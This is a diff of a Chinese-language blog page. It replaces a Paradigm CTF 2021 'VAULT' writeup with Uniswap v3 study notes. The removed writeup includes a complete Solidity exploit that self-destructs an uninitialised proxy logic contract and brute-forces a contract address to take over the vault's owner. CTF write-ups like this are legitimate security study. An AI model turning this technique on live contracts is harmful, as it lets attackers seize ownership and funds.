@@ -16,25 +16,30 @@
   <meta name="author" content="Sissice">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog Writeup | Paradigm CTF 2021 Part two - Sissice’s Blog VAULT这道题涉及到了 EIP1167 代理合约  通过挑战的要求是改变代理合约的 owner 123function isSolved() public view returns">
+    <meta name="description" content="概述Uniswap v3 白皮书 v2核心公式x*y&#x3D;k，即池子中资产X的数量 * 资产Y的数量 &#x3D; 流动性数量。  但是资金利用率不高  当用户用 X 换取 Y 的时候，价格会从低点涨到高点，红点从 p_lower 移动到 p_upper 的过程中（X 的价格），实际参与交易的流动性仅仅是橙色的矩形区域。 所以提高利用率的关键是既要移除那些躺在那不干活的流动性（绿色区域），又要保证这个函数模型不">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Writeup | Paradigm CTF 2021 Part three">
-<meta property="og:url" content="http://example.com/2022/10/03/ParadigmCTF2021three/index.html">
+<meta property="og:title" content="Uniswap v3 学习笔记">
+<meta property="og:url" content="http://example.com/2022/10/04/uniswap-v3-learning/index.html">
 <meta property="og:site_name" content="Sissice&#39;s Blog">
-<meta property="og:description" content="Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog Writeup | Paradigm CTF 2021 Part two - Sissice’s Blog VAULT这道题涉及到了 EIP1167 代理合约  通过挑战的要求是改变代理合约的 owner 123function isSolved() public view returns">
+<meta property="og:description" content="概述Uniswap v3 白皮书 v2核心公式x*y&#x3D;k，即池子中资产X的数量 * 资产Y的数量 &#x3D; 流动性数量。  但是资金利用率不高  当用户用 X 换取 Y 的时候，价格会从低点涨到高点，红点从 p_lower 移动到 p_upper 的过程中（X 的价格），实际参与交易的流动性仅仅是橙色的矩形区域。 所以提高利用率的关键是既要移除那些躺在那不干活的流动性（绿色区域），又要保证这个函数模型不">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-10-03T13:52:43.000Z">
-<meta property="article:modified_time" content="2022-10-03T13:58:00.155Z">
+<meta property="og:image" content="http://example.com/2022/10/04/uniswap-v3-learning/understanding-01-pricechange.webp">
+<meta property="og:image" content="http://example.com/2022/10/04/uniswap-v3-learning/understanding-02-liquidityrate.png">
+<meta property="og:image" content="http://example.com/2022/10/04/uniswap-v3-learning/understanding-03-realliquidity.png">
+<meta property="og:image" content="http://example.com/2022/10/04/uniswap-v3-learning/rbuQJaMz60f3e528e4f29.png">
+<meta property="og:image" content="http://example.com/2022/10/04/uniswap-v3-learning/study/BlockChain/paper/uniswapV3/uJBTSEHA60f3e535b476c.png">
+<meta property="article:published_time" content="2022-10-04T12:51:17.000Z">
+<meta property="article:modified_time" content="2022-10-04T12:52:24.130Z">
 <meta property="article:author" content="Sissice">
-<meta property="article:tag" content="靶场刷题">
 <meta property="article:tag" content="Etherum">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/10/04/uniswap-v3-learning/understanding-01-pricechange.webp">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Writeup | Paradigm CTF 2021 Part three - Sissice&#39;s Blog</title>
+  <title>Uniswap v3 学习笔记 - Sissice&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -190,7 +195,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Writeup | Paradigm CTF 2021 Part three"></span>
+            <span id="subtitle" data-typed-text="Uniswap v3 学习笔记"></span>
           
         </div>
 
@@ -201,8 +206,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-10-03 21:52" pubdate>
-          2022年10月3日 晚上
+        <time datetime="2022-10-04 20:51" pubdate>
+          2022年10月4日 晚上
         </time>
       </span>
     
@@ -213,7 +218,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.3k 字
+          1.5k 字
         
       </span>
     
@@ -224,7 +229,7 @@
         
         
         
-          28 分钟
+          13 分钟
         
       </span>
     
@@ -270,43 +275,54 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Writeup | Paradigm CTF 2021 Part three</h1>
+            <h1 style="display: none">Uniswap v3 学习笔记</h1>
             
             
               <div class="markdown-body">
                 
-                <p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/18/ParadigmCTF2021one/">Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog</a></p>
-<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/23/ParadigmCTF2021two/">Writeup | Paradigm CTF 2021 Part two - Sissice’s Blog</a></p>
-<h2 id="VAULT"><a href="#VAULT" class="headerlink" title="VAULT"></a>VAULT</h2><p>这道题涉及到了 <a target="_blank" rel="noopener" href="https://learnblockchain.cn/article/721">EIP1167 代理合约</a> </p>
-<p>通过挑战的要求是改变代理合约的 owner</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return vault.owner() != address(this);<br>&#125;<br></code></pre></td></tr></table></figure>
+                <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><a target="_blank" rel="noopener" href="https://uniswap.org/whitepaper-v3.pdf">Uniswap v3 白皮书</a></p>
+<h2 id="v2核心公式"><a href="#v2核心公式" class="headerlink" title="v2核心公式"></a>v2核心公式</h2><p><code>x*y=k</code>，即池子中<code>资产X的数量 * 资产Y的数量 = 流动性数量</code>。</p>
+<p><img src="/2022/10/04/uniswap-v3-learning/understanding-01-pricechange.webp" srcset="/img/loading.gif" lazyload alt="price changing"></p>
+<p>但是资金利用率不高</p>
+<p><img src="/2022/10/04/uniswap-v3-learning/understanding-02-liquidityrate.png" srcset="/img/loading.gif" lazyload alt="liquidity rate"></p>
+<p>当用户用 X 换取 Y 的时候，价格会从低点涨到高点，红点从 <code>p_lower</code> 移动到 <code>p_upper</code> 的过程中（X 的价格），实际参与交易的流动性仅仅是橙色的矩形区域。</p>
+<p>所以提高利用率的关键是既要移除那些躺在那不干活的流动性（绿色区域），又要保证这个函数模型不变。于是我们将其换成了虚拟的流动性，即 <code>x_virtual</code> 和 <code>y_virtual</code>，而添加流动性时，只需要注入橙色区域的流动性即可。于是公式变成了如下模样：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(x + x_virtual)</span>*<span class="hljs-comment">(y + y_virtual)</span>=k<br></code></pre></td></tr></table></figure>
 
-<p>先看一下整体逻辑</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function Setup() public &#123;<br>	// 设定 SingleOwnerGuard 为 guard defaultImplementation<br>    registry = new GuardRegistry();<br>    registry.registerGuardImplementation(new SingleOwnerGuard(), true);<br><br>    // 利用EIP-1167创建一个代理合约 vault<br>    // 原合约是 SingleOwnerGuard<br>    vault = new Vault(registry);<br><br>    // 授权 deposit 和 withdraw 两个函数<br>    SingleOwnerGuard guard = SingleOwnerGuard(vault.guard());<br>    guard.addPublicOperation(&quot;deposit&quot;);<br>    guard.addPublicOperation(&quot;withdraw&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/10/04/uniswap-v3-learning/understanding-03-realliquidity.png" srcset="/img/loading.gif" lazyload alt="real liquidity"></p>
+<p>整个图形向左下方平移了，因为价格是直线的斜率，所以平移对于实际交易是没有影响的。<strong>前提是价格没有超出限定的区间</strong>。</p>
+<h2 id="v3核心公式"><a href="#v3核心公式" class="headerlink" title="v3核心公式"></a>v3核心公式</h2><p>将代表流动性的 <code>k</code> 换成 <code>𝐿^2</code> 即 L 的平方</p>
+<p>可以看出 <code>x_virtual</code> 的长度实际是 <code>p_upper</code> 点的 x，而 <code>y_virtual</code> 的长度实际上是 <code>p_lower</code> 点的 y。</p>
+<p>有价格的公式 <code>y = p*x</code> 和 <code>xy=L^2</code> </p>
+<p>可以得出</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">x = L / √p<br>y = L * √p<br><br><span class="hljs-regexp">//</span>也就是<br>x_virtual = L / √p_upper<br>y_virtual = L * √p_lower<br><br><span class="hljs-regexp">//</span>即核心公式<br>(x + L / √p_upper) * (y + L * √p_lower) = L^<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
 
-<p>关键爆破点：</p>
+<p>可以看到，公式中是将 <code>p_upper</code> 和 <code>p_lower</code> 作为已知的变量，所以在 V3 中添加流动性，是需要用户自己设置需要做市的价格区间的。V3 中创建者不同或者价格区间不同（或手续费水平不同，后面展开讨论）都是不同的流动性头寸 <code>position</code>。</p>
+<h2 id="AMM"><a href="#AMM" class="headerlink" title="AMM"></a>AMM</h2><p>AMM，全称Automated Market Makers，翻译过来是自动做市商。其基础模型来源于Vitalik于2017年发表的<a target="_blank" rel="noopener" href="https://vitalik.ca/general/2017/06/22/marketmakers.html">博客</a>，讨论了“恒定乘机公式”，即每一个Uniswap Pair 中存有两种资产，并为这两种资产提供流动性。</p>
+<p>swap中的曲线移动</p>
+<p><img src="/2022/10/04/uniswap-v3-learning/rbuQJaMz60f3e528e4f29.png" srcset="/img/loading.gif" lazyload alt="image20210717105238162.png"></p>
+<p>mint中的曲线移动</p>
+<p><img src="/2022/10/04/uniswap-v3-learning/study/BlockChain/paper/uniswapV3/uJBTSEHA60f3e535b476c.png" srcset="/img/loading.gif" lazyload alt="image20210717113439641.png"></p>
+<p>burn是mint的逆向</p>
+<h2 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h2><p>Uniswap v3 在代码层面的架构和 v2 基本保持一致，将合约分成了两个仓库：</p>
 <ul>
-<li><p>构造函数相关的字节码在<code>init-code</code> 中，只能被调用一次。而自定义的<code>initialize()</code>方法存在于<code>runtime code</code>中，可被反复调用，需要自己写逻辑保证只能调用一次。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 构造函数<br>function Vault(GuardRegistry registry_) public &#123;<br>    owner = msg.sender;<br>    registry = registry_;<br>  <br>    createGuard(registry.defaultImplementation());<br>&#125;<br>  <br>// create new guard instance<br>// 利用EIP-1167创建一个代理合约<br>// 传入的是逻辑合约<br>function createGuard(bytes32 implementation) private returns (Guard) &#123;<br>    address impl = registry.implementations(implementation);<br>    require(impl != address(0x00));<br>  <br>    if (address(guard) != address(0x00)) &#123;<br>        guard.cleanup();<br>    &#125;<br>  <br>    // 创建代理合约<br>    guard = Guard(createClone(impl));<br>    // 代理合约的初始化<br>    guard.initialize(this);<br>    return guard;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>在 Vault 中只初始化了代理合约，而真正的逻辑合约 SingleOwnerGuard 并没有被初始化，类似于著名事件 <a target="_blank" rel="noopener" href="https://github.com/openethereum/parity-ethereum/issues/6995">anyone can kill your contract</a></p>
-</li>
-<li><p>调用一个被销毁的合约，它只是会执行STOP这一个OPCODE，不会REVERT，也就是说会调用成功</p>
-</li>
-<li><p>在solidity&lt;0.5.0的版本中，返回值存放的位置指针与参数值的内存指针指向同一块内存地址。返回值拷贝到内存中时，如果返回值的实际长度为0，则其实际上拷贝到内存中的数值长度也为0。CALL不会去覆盖内存的值。</p>
-<p>这意味着如果我们销毁了逻辑合约 SingleOwnerGuard ，那么会得到内存中已经存在的内容，即输入</p>
-<p>因此当 SingleOwnerGuard 被销毁以后，我们传入的地址的第16位数值就是 error 的内存位置</p>
-<p>这里可以选择使用 create 或者 create2 来生成特定的合约地址，使合约地址第16位为 NO_ERROR，绕开权限检查</p>
-</li>
-<li><p>emergencyCall 函数可以自行传入data，也就是说只要绕开了权限检查，我们可以做任何事</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function emergencyCall(address target, bytes memory data) public &#123;<br>    require(checkAccess(&quot;emergencyCall&quot;));<br><br>    require(target.delegatecall(data));<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Uniswap/v3-core">Uniswap-v3-core</a><ul>
+<li>UniswapV3Factory 是交易池(UniswapV3Pool)统一创建的接口。</li>
+<li>UniswapV3Pool 由 UniswapV3PoolDeployer 统一部署。 实现代币交易，流动性管理，交易手续费的收取，oracle 数据管理。接口的实现粒度比较低，不适合普通用户使用，错误的调用其中的接口可能会造成经济上的损失。 UniswapV3Pool 是核心逻辑，管理了 Tick 和 Position，实现流动性管理以及一个交易池中 swap 功能实现。</li>
 </ul>
-<p>完整的demo</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.16;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract FakeVault &#123;<br>    SingleOwnerGuard public guard;<br><br>    function get(GuardRegistry registry) public &#123;<br>        guard = SingleOwnerGuard(registry.implementations(registry.defaultImplementation()));<br>    &#125;<br><br>    function cleanup() public &#123;<br>        guard.initialize(Vault(address(this)));<br>        guard.cleanup();<br>    &#125;<br><br>    function owner() public returns (address) &#123;<br>        return address(this);<br>    &#125;<br><br>    // 在 cleanup() 中会有判断 guard() 的逻辑<br>    function guard() external view returns (address) &#123;<br>        return msg.sender;<br>    &#125;<br>&#125;<br><br>contract OwnershipTaker &#123;<br>    function doit(Vault vault) public &#123;<br>        // data 为 0，就是调用 fallback 函数<br>        vault.emergencyCall(msg.sender, new bytes(0));<br>    &#125;<br>&#125;<br><br>contract vaultExploit &#123;<br>    // 注意：要修改的 owner 的位置需要和目标合约 vault 中的 owner 的位置相同，否则无法进行修改<br>    address owner;<br>    vaultSetup private setup;<br>    OwnershipTaker addr;<br><br>    function vaultExploit(vaultSetup setup_) public &#123;<br>        setup = setup_;<br>    &#125;<br><br>    // 销毁逻辑合约<br>    function part1() public &#123;<br>        FakeVault fakeVault = new FakeVault();<br>        // 获得逻辑合约地址<br>        fakeVault.get(setup.registry());<br>        // 初始化并销毁<br>        fakeVault.cleanup();<br>    &#125;<br><br>    function part2() public &#123;<br>        while(true) &#123;<br>            // 使用 CREATE 来创造合约<br>            addr = new OwnershipTaker();<br>            // 判断是否满足条件<br>            if (bytes20(address(addr))[15] == hex&#x27;00&#x27;) &#123;<br>                break;<br>            &#125;<br>        &#125;<br>        // 调用特定合约地址中的攻击函数<br>        addr.doit(setup.vault());<br><br>    &#125;<br><br>    // 在 fallback 函数里面实现修改 owner 的逻辑<br>    function() external &#123;<br>        owner = address(0);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-
-
-
-<p>后续题目更新中……</p>
+</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Uniswap/v3-periphery">Uniswap-v3-periphery</a><ul>
+<li>NonfungiblePositionManager 负责交易池的创建以及流动性的添加删除，用来增加/移除/修改 Pool 的流动性，并且通过 NFT token 将流动性代币化。使用 ERC721 token（v2 使用的是 ERC20）的原因是同一个池的多个流动性并不能等价替换（v3 的集中流性动功能）。</li>
+<li>SwapRouter 是 swap 路由的管理。提供代币交易的接口，它是对 UniswapV3Pool 合约中交易相关接口的进一步封装，前端界面主要与这个合约来进行对接。</li>
+</ul>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/08/20/uniswap-v3-1/">Uniswap Part Ⅰ | 创建交易对 - Sissice’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/08/20/uniswap-v3-2/">Uniswap Part Ⅱ | 提供/移除流动性 - Sissice’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/29/uniswap-v3-3/">Uniswap Part Ⅲ | 交易过程 - Sissice’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/29/uniswap-v3-4/">Uniswap Part Ⅳ | 交易手续费 - Sissice’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/29/uniswap-v3-5/">Uniswap Part Ⅴ | 预言机 - Sissice’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://sissice.github.io/2022/09/29/uniswap-v3-6/">Uniswap Part Ⅵ | 闪电贷 - Sissice’s Blog</a></p>
 
                 
               </div>
@@ -318,8 +334,6 @@
   
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/">#靶场刷题</a>
       
         <a href="/tags/Etherum/">#Etherum</a>
       
@@ -333,8 +347,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Writeup | Paradigm CTF 2021 Part three</div>
-      <div>http://example.com/2022/10/03/ParadigmCTF2021three/</div>
+      <div>Uniswap v3 学习笔记</div>
+      <div>http://example.com/2022/10/04/uniswap-v3-learning/</div>
     </div>
     <div class="license-meta">
       
@@ -346,7 +360,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年10月3日</div>
+          <div>2022年10月4日</div>
         </div>
       
       
@@ -378,18 +392,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/10/04/uniswap-v3-learning/" title="Uniswap v3 学习笔记">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Uniswap v3 学习笔记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/09/30/EVM-Puzzles-wp/" title="Writeup | EVM-Puzzles">
-                        <span class="hidden-mobile">Writeup | EVM-Puzzles</span>
+                      <a href="/2022/10/03/ParadigmCTF2021three/" title="Writeup | Paradigm CTF 2021 Part three">
+                        <span class="hidden-mobile">Writeup | Paradigm CTF 2021 Part three</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
